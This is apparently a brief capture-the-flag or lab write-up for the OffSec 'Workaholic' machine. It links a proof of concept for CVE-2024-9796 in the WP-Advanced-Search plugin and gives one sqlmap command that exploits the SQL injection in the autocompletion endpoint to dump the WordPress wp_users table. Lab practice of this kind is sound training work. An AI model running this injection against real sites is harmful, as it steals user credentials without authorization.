# Workaholic - WP-Advanced-Search CVE-2024-9796

## WP-Advanced-Search - CVE-2024-9796

https://github.com/RandomRobbieBF/CVE-2024-9796

```bash
sqlmap -u "http://workaholic.offsec/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?t=wp_autosuggest&f=words&l=5&type=0&e=utf-8&q=c&limit=5&timestamp=19692269759899" --level=5 --risk=3 -D wordpress -T wp_users --column --dump
```
